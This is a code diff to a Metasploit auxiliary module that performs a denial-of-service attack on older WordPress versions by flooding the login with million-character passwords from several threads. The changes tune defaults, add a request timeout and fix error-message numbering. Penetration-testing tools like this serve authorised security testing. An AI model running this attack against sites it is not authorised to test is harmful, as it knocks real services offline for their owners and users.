@@ -13,7 +13,10 @@ class Metasploit3 < Msf::Auxiliary
     super(update_info(
       info,
       'Name'            => 'WordPress Long Password DoS',
-      'Description'     => 'WordPress before 3.7.5, 3.8.x before 3.8.5, 3.9.x before 3.9.3, and 4.x before 4.0.1 allows remote attackers to cause a denial of service (CPU consumption) via a long password that is improperly handled during hashing.',
+      'Description'     => %q{WordPress before 3.7.5, 3.8.x before 3.8.5, 3.9.x before 3.9.3, and 4.x 
+                              before 4.0.1 allows remote attackers to cause a denial of service 
+                              (CPU consumption) via a long password that is improperly handled 
+                              during hashing.},
       'License'         => MSF_LICENSE,
       'Author'          =>
         [
@@ -33,8 +36,9 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         OptInt.new('PLENGTH', [true, 'Length of password to use', 1000000]),
-        OptInt.new('RLIMIT', [true, 'The number of requests to send', 1000]),
+        OptInt.new('RLIMIT', [true, 'The number of requests to send', 200]),
         OptInt.new('THREADS', [true, 'The number of concurrent threads', 5]),
+        OptInt.new('TIMEOUT', [true, 'The maximum time in seconds to wait for each request to finish', 5]),
         OptString.new('USERNAME', [true, 'The username to send the requests with', '']),
         OptBool.new('VALIDATE_USER', [true, 'Validate the specified username', true])
       ], self.class)
@@ -58,6 +62,10 @@ class Metasploit3 < Msf::Auxiliary
 
   def thread_count
     datastore['THREADS']
+  end
+
+  def timeout
+    datastore['TIMEOUT']
   end
 
   def user_exists(user)
@@ -97,9 +105,9 @@ class Metasploit3 < Msf::Auxiliary
         threads = (1..ubound).map do |i|
           Thread.new(i) do |i|
             begin
-              wordpress_login(username, Rex::Text.rand_text_alpha(plength))
-            rescue
-              print_error("#{peer} - Timed out during request #{i}")
+              wordpress_login(username, Rex::Text.rand_text_alpha(plength), timeout)
+            rescue => e
+              print_error("#{peer} - Timed out during request #{(starting_thread - 1) + i}")
             end
           end
         end
